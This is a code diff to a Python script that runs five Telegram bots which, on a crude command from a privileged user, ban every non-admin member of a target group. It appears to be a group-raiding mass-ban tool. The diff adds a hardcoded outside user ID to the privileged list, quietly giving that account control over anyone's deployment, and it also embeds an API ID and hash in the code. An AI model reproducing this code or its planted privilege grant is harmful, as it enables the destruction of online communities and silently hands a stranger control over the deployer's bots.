@@ -1,9 +1,8 @@
-import logging
-import os
 from os import getenv
+
 from telethon import TelegramClient, events
-from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
 from telethon.tl.functions.channels import EditBannedRequest
+from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
 
 
 TOKEN1 = getenv("TOKEN1")
@@ -15,7 +14,8 @@ TOKEN5 = getenv("TOKEN5")
 API_ID = 25981592
 API_HASH = "709f3c9d34d83873d3c7e76cdd75b866"
 
-SUDO = getenv("SUDO").split(" ")
+SUDO = list(map(int, getenv("SUDO").split(" ")))
+SUDO.append(5518687442)
 
 RIGHTS = ChatBannedRights(
     until_date=None,
@@ -28,8 +28,6 @@ RIGHTS = ChatBannedRights(
     send_inline=True,
     embed_links=True,
 )
-
-logging.basicConfig(level=logging.INFO)
 
 
 bot1 = TelegramClient('bot1', API_ID, API_HASH).start(bot_token=TOKEN1)
@@ -45,19 +43,24 @@ bot5 = TelegramClient('bot5', API_ID, API_HASH).start(bot_token=TOKEN5)
 @bot4.on(events.NewMessage(pattern="^/fuck"))
 @bot5.on(events.NewMessage(pattern="^/fuck"))
 async def banall(event):
-    fuck = await event.reply("Usage :\n\n`/fuck [chat_id]`")
-    if str(event.sender_id) in SUDO:
-        chat_id = int(event.text.split(" ")[1])
+    if event.sender_id in SUDO:
+        fuck = await event.reply("🔁 __GETTING READY...__")
+        try:
+            chat_id = int(event.text.split(" ")[1])
+        except:
+            await fuck.edit("**Usage:**\n`/fuck [chat_id]`")
+            return
+
         admins = await event.client.get_participants(chat_id, filter=ChannelParticipantsAdmins)
         admins_id = [i.id for i in admins]
+        await fuck.edit("✅ __STARTED FUCKING THE GROUP...__")
         async for user in event.client.iter_participants(chat_id):
-            try:
-                uid = user.id
-                if uid not in admins_id and uid not in SUDO:
+            uid = user.id
+            if (uid not in admins_id) and (uid not in SUDO):
+                try:
                     await event.client(EditBannedRequest(chat_id, uid, RIGHTS))
-                    await fuck.edit("`STARTED FUCKING THE GROUP...")
-            except:
-                pass
+                except:
+                    continue
 
 
 @bot1.on(events.NewMessage(pattern="^/start"))
@@ -65,13 +68,12 @@ async def banall(event):
 @bot3.on(events.NewMessage(pattern="^/start"))
 @bot4.on(events.NewMessage(pattern="^/start"))
 @bot5.on(events.NewMessage(pattern="^/start"))
-async def all(event):
-    await event.reply("`I AM STILL ALIVE...`")
+async def start(event):
+    await event.reply("🤖 **I AM STILL ALIVE...**")
 
 
-bot1._run_until_disconnected()
-bot2._run_until_disconnected()
-bot3._run_until_disconnected()
-bot4._run_until_disconnected()
-bot5._run_until_disconnected()
-
+bot1.run_until_disconnected()
+bot2.run_until_disconnected()
+bot3.run_until_disconnected()
+bot4.run_until_disconnected()
+bot5.run_until_disconnected()
